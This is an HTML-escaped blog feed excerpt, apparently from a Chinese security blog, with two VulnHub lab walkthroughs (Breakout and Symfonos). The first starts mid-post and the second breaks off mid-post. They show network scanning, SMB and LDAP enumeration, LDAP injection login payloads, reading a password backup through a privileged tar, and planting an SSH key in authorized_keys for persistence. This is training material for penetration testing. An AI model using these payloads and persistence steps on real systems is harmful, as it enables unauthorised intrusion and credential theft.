&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;shell&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat &amp;gt; myip.txt &amp;lt;&amp;lt; EOF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;192.168.31.1 192.168.31.25 192.168.31.58 192.168.31.86 192.168.31.33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;192.168.31.120 192.168.31.135 192.168.31.145 192.168.31.162 192.168.31.44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;EOF&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;去除一些已知 ip 的机器，对剩余 IP 进行端口扫描，判断目标 IP&lt;br&gt;
 &lt;code&gt;sudo nmap -PA 192.168.31.0/24 --excludefile myip.txt&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-047.png&#34; width=&#34;540&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 目标机器的 ip 地址： 192.168.31.127&lt;/p&gt;
&lt;h3 id=&#34;端口扫描&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#端口扫描&#34;&gt;#&lt;/a&gt; 端口扫描&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;sudo nmap -A -p 1-1024 192.168.31.127 -oN /tmp/breakout.txt&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-048.png&#34; width=&#34;500&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;brainfuck-解密&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#brainfuck-解密&#34;&gt;#&lt;/a&gt; Brainfuck 解密&lt;/h3&gt;
&lt;p&gt;打开网站：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTI3&#34;&gt;http://192.168.31.127&lt;/span&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;对此网站进行目录扫描&lt;br&gt;
 &lt;code&gt;dirsearch -u http://192.168.31.127&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-049.png&#34; width=&#34;530&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;审查源代码&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;找到加密的密码如下：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;++++++++++[&amp;gt;+&amp;gt;+++&amp;gt;+++++++&amp;gt;++++++++++&amp;lt;&amp;lt;&amp;lt;&amp;lt;-]&amp;gt;&amp;gt;++++++++++++++++.++++.&amp;gt;&amp;gt;+++++++++++++++++.----.&amp;lt;++++++++++.-----------.&amp;gt;-----------.++++.&amp;lt;&amp;lt;+.&amp;gt;-.--------.++++++++++++++++++++&amp;lt;------------.&amp;gt;&amp;gt;---------.&amp;lt;&amp;lt;++++++.++++++.&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;brainfuck 加密&lt;br&gt;
此为 brainfuck 加密：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jdGYuYnVna3UuY29tL3Rvb2wvYnJhaW5mdWNr&#34;&gt;https://ctf.bugku.com/tool/brainfuck&lt;/span&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-050.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;-&amp;gt; 某密码为  &lt;code&gt;.2uqPEfj3D&amp;lt;P&#39;a-3&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;smb-漏洞利用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#smb-漏洞利用&#34;&gt;#&lt;/a&gt; SMB 漏洞利用&lt;/h3&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;smbclient 枚举&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;smbclient -N -L 192.168.31.127&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-051.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;smbclient 测试&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;smbclient //192.168.31.127/IPC$ -N&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-052.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;Enum4linux 是用于枚举 windows 和 Linux 系统上的 SMB 服务的工具。可以轻松的从与 SMB 有关的目标中快速提取信息。通常可以确信，如果打开了端口 139 和 445 ，则 SMB 正在运行。使用 Enum4linux 收集信息我们需要做的第一件事是确定目标上是否存在 SMB。&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;使用enum4linux 进行枚举SMB 信息&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;enum4linux -A 192.168.31.127&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-053.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;-&amp;gt; 得到一个用户名：cyber&lt;/p&gt;
&lt;h3 id=&#34;tar-提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#tar-提权&#34;&gt;#&lt;/a&gt; Tar 提权&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;登录服务器&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;ssh cyber@192.168.31.127&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;Pass:.2uqPEfj3D&amp;lt;P&lt;span class=&#34;string&#34;&gt;&amp;#x27;a-3&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-054.png&#34; width=&#34;600&#34; alt=&#34;Image&#34;&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;找到一个敏感命令 tar 可以用调用 root 权限&lt;/li&gt;
&lt;/ol&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-055.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;寻找敏感文件&lt;br&gt;
 &lt;code&gt;ls /var/backups/ -Alh&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-056.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;利用 tar 及备份文件&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;利用具有root权限的tar去压缩这个备份文件里边的密码:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;./tar -zcvf pass.tar.gz /var/backups/.old_pass.bak&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;进行解压：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;tar -zxvf pass.tar.gz&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;查看解压之后的文件：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat ./var/backups/.old_pass.bak&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;密码显示为：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Ts&amp;amp;4&amp;amp;YurgtRX(=~h&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-057.png&#34; width=&#34;460&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;ssh-密钥对维权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ssh-密钥对维权&#34;&gt;#&lt;/a&gt; SSH 密钥对维权&lt;/h3&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;提前准备好配对好的私钥和公钥，将公钥发到靶机&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;scp parallels@192.168.31.135:~/.ssh/id_rsa.pub ~/.ssh/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat ~/id_rsa.pub &amp;gt;&amp;gt; ~/authorized_keys&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rm - f id_rsa.pub&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-058.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;用私钥登录&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ll | grep id&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ssh root@192.168.31.127 -i ~/.ssh/id_rsa&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-059.png&#34; width=&#34;515&#34; alt=&#34;Image&#34;&gt;
</content>
        <category term="VULNHUB 1-10" />
        <updated>2021-10-31T16:00:00.000Z</updated>
    </entry>
    <entry>
        <id>http://www.n1h1l157.live/2021/11/01/VULNHUB/106%20SYMFONOS/</id>
        <title>VULNHUB 6 SYMFONOS</title>
        <link rel="alternate" href="http://www.n1h1l157.live/2021/11/01/VULNHUB/106%20SYMFONOS/"/>
        <content type="html">&lt;p&gt;靶机下载地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvc3ltZm9ub3MtNTIsNDE1Lw==&#34;&gt;https://www.vulnhub.com/entry/symfonos-52,415/&lt;/span&gt;&lt;br&gt;
 教程链接地址 1：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9yZWFkeXNldGV4cGxvaXQud29yZHByZXNzLmNvbS8yMDIyLzAzLzAyL3Z1bG5odWItc3ltZm9ub3MtNS0yLw==&#34;&gt;https://readysetexploit.wordpress.com/2022/03/02/vulnhub-symfonos-5-2/&lt;/span&gt;&lt;br&gt;
 教程链接地址 2：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2FyeWFuZ3VlbnRobmVyL1Z1bG5odWItQ1RGLVdyaXRldXBz&#34;&gt;https://github.com/aryanguenthner/Vulnhub-CTF-Writeups&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
 靶机 SYMFONOS：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;通过 netdiscover 扫描当前网卡里边有哪些机器&lt;br&gt;
 &lt;code&gt;sudo netdiscover -i eth0 -r 192.168.31.0/24&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-084.png&#34; alt&gt;&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;将所有已知的 ip 暂时存档，对这类 ip 地址不做端口扫描&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;shell&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat &amp;gt; myip.txt &amp;lt;&amp;lt; EOF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;192.168.31.1 192.168.31.25 192.168.31.58 192.168.31.86 192.168.31.33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;192.168.31.120 192.168.31.135 192.168.31.145 192.168.31.162 192.168.31.44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;EOF&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;去除一些已知 ip 的机器，对剩余 IP 进行端口扫描，判断目标 IP&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;code&gt;sudo nmap -PA 192.168.31.0/24 --excludefile myip.txt&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-085.png&#34; width=&#34;450&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 目标机器的 ip 地址： 192.168.31.81&lt;/p&gt;
&lt;h3 id=&#34;端口扫描&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#端口扫描&#34;&gt;#&lt;/a&gt; 端口扫描&lt;/h3&gt;
&lt;p&gt;sudo nmap -A -p 1-1024 192.168.31.81 -oN /tmp/symfonos.txt&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-086.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;gobuster-扫描目录&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#gobuster-扫描目录&#34;&gt;#&lt;/a&gt; Gobuster 扫描目录&lt;/h3&gt;
&lt;p&gt;打开网站：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuODE=&#34;&gt;http://192.168.31.81&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-087.png&#34; alt&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;目录扫描&lt;/li&gt;
&lt;/ol&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-088.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuODEvYWRtaW4ucGhw&#34;&gt;http://192.168.31.81/admin.php&lt;/span&gt;&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-089.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;尝试弱口令，注入等均无效&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;加载字典，更详细的扫描&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;gobuster dir -u http://192.168.31.81/ -w /usr/share/dirbuster/wordlists/directory-list-&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2.3-medium.txt -x php,txt,html&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-090.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuODEvcG9ydHJhaXRzLnBocA==&#34;&gt;http://192.168.31.81/portraits.php&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-091.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;ldap-枚举&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ldap-枚举&#34;&gt;#&lt;/a&gt; LDAP 枚举&lt;/h3&gt;
&lt;p&gt;在 LDAP 上做一个快速枚举，看看是否有任何信息暴露给我们看&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;ldapsearch 使用&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ldapsearch -h 192.168.31.81 -x -s namingcontexts&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;-x Simple authentication&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;-s scope one of base, one, sub or children (search scope)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;-H URI LDAP Uniform Resource Identifier(s)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-092.png&#34; width=&#34;400&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 关键信息: dn:namingContexts, dc=symfonos, dc=local&lt;/p&gt;
&lt;h3 id=&#34;ldap-注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ldap-注入&#34;&gt;#&lt;/a&gt; LDAP 注入&lt;/h3&gt;
&lt;p&gt;考虑到 ldap 在这台机器上运行，可尝试用 ldap 注入登录框&lt;br&gt;
 ldap 注入 poc：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ib29rLmhhY2t0cmlja3MueHl6L3BlbnRlc3Rpbmctd2ViL2xkYXAtaW5qZWN0aW9u&#34;&gt;https://book.hacktricks.xyz/pentesting-web/ldap-injection&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-093.png&#34; alt&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;payload&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;(&amp;amp;(user=*)(password=*))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;(&amp;amp;(user=*)(&amp;amp;)(password=*)(&amp;amp;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;(&amp;amp;(user=*)(|(&amp;amp;)(pass=pwd))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;通过 user=* 和 password=* 登陆到了该站点&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-094.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;发现了一个 ssrf 跨服务请求伪造:&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuODEvaG9tZS5waHA/dXJsPWh0dHA6Ly8xOTIuMTY4LjMxLjgxL3BvcnRyYWl0cy5waHA=&#34;&gt;http://192.168.31.81/home.php?url=http://192.168.31.81/portraits.php&lt;/span&gt;&lt;/p&gt;
